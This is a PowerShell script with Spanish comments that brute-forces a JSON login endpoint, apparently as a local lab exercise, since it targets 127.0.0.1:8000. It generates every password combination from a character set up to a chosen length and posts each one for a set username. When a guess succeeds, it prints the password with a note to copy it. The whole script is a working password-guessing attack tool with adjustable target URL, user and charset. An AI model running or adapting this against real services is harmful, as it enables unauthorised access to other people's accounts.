# brute_digits.ps1 - PowerShell muy simple o eso creo

#

# Puedo cambiar el usuario si quiero, y lo interesante es abrir otro cmd del server

# Y otro del atacante xd

#

# la extension ps1 es obligatorio, aunque puedo cambiar lo anterior a la extension, ya que sirve como

# Invoke‑RestMethod,osea, manejo de objetos JSON entre otros

#

# brute_digits.ps1 - versión 2.0

# Cambia manualmente $Chars para usar otro conjunto (ej: "abcdefghijklmnopqrstuvwxyz0123456789")

#

# brute_chars.ps1 - PowerShell muy simple (prueba combinaciones de un conjunto de caracteres)

#

# Ejecutar: .\brute_digits.ps1 -User siu -Digits 1

# Cambia $Chars para probar letras, números o ambos

param(
    [string]$User = "siu",
    [int]$MinLen = 1,
    [int]$MaxLen = 3,
    [string]$Chars = "abcdefghijklmnopqrstuvwxyz0123456789",
    [string]$Url = "http://127.0.0.1:8000/login"
)
# Validaciones simples para que no te equivoques con los parámetros

if ($MinLen -lt 1 -or $MaxLen -lt $MinLen) {
Write-Host "Parámetros inválidos: asegúrate MinLen >=1 y MaxLen >= MinLen."
exit 1
}
if ($MaxLen -gt 6) { Write-Host "Atención: MaxLen grande produce muchas combinaciones." }

# Esto hace que PowerShell muestre bien caracteres (ej: emojis) en algunas consolas de Windows

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::new()

# -------------------------

# Función que prueba una contraseña

# -------------------------

# - Envía al servidor { username, password } en JSON.

# - Si el servidor responde OK (200), imprime que encontró la clave y muestra el mensaje de la API

# - Si responde con error (401, 403, etc.) o falla la conexión, imprime un mensaje apropiado


function Try-Password($pw) {
    try {
        # Construir el body JSON
        $bodyJson = ConvertTo-Json @{ username = $User; password = $pw }

        # Llamada correcta a Invoke-RestMethod (asegúrate $Url no tenga corchetes)
        $response = Invoke-RestMethod -Uri $Url -Method Post -Body $bodyJson -ContentType "application/json" -TimeoutSec 5 -ErrorAction Stop

        Write-Host "Se encontró la clave del usuario $User . La clave es copiala y cambiala xd: $pw"

        if ($null -ne $response.message) {
            Write-Host "Mensaje de respuesta: $($response.message)"
        } else {
            Write-Host "Respuesta: " ($response | ConvertTo-Json -Depth 2)
        }
        return $true

    } catch {
        # Mejor manejo del error: mostramos info disponible
        $ex = $_.Exception
        if ($ex.Response -ne $null) {
            try {
                $status = $ex.Response.StatusCode.value__
                Write-Host "Probando $pw -> $status"
            } catch {
                Write-Host "Probando $pw -> error en la respuesta del servidor (no se pudo leer status)."
            }
        } else {
            # No hubo respuesta (timeout, servidor caído, DNS, firewall, URL incorrecto, etc.)
            Write-Host "Probando $pw -> petición fallida (timeout o error de red). Mensaje: $($ex.Message)"
        }
        return $false
    }
}

# -------------------------

# Generador de combinaciones simple

# -------------------------

# Idea simple (sin magia):

# - Para cada longitud L (MinLen a MaxLen)

# - Mantengo un array de índices (ej: [0,0,0] para L=3)

# - Cada índice apunta a una posición en $Chars

# - Construyo la contraseña juntando los caracteres indicados por el array

# - Incremento el "contador" desde la derecha (como sumar 1)

#

# Esto genera todas las combinaciones en orden, sin usar recursion ni librerías adicionales

$charsetLen = $Chars.Length

for ($len = $MinLen; $len -le $MaxLen; $len++) {
Write-Host "Probando longitud" $len "..."

# Creamos un arreglo con $len ceros. Cada elemento será un índice en $Chars

$indices = @(0..($len-1) | ForEach-Object { 0 })

while ($true) {
# Construir la contraseña actual a partir de los índices.
# Ejemplo: si indices = [0,1] y $Chars = "ab...", entonces pw = "ab"
$pw = -join ($indices | ForEach-Object { $Chars[$_] })


# Probar la contraseña construida.
if (Try-Password $pw) { exit 0 }  # si es correcta, salimos de todo

# Incrementar el "contador" manualmente:
# empezamos por la posición menos significativa (la última),
# le sumamos 1; si se pasa del charset, la ponemos a 0 y subimos al anterior
$pos = $len - 1
while ($pos -ge 0) {
  $indices[$pos]++
  if ($indices[$pos] -lt $charsetLen) { break }  # sin carry, seguimos con la siguiente pw
  $indices[$pos] = 0
  $pos--
}
# Si pos < 0 significa que todos los dígitos hicieron overflow -> terminamos esta longitud
if ($pos -lt 0) { break }


}
}

# Si llegamos hasta aquí, no se encontró la clave en el rango pedido

Write-Host "No se encontró la clave en longitudes" $MinLen ".." $MaxLen "(charset length" $charsetLen ")"
exit 0
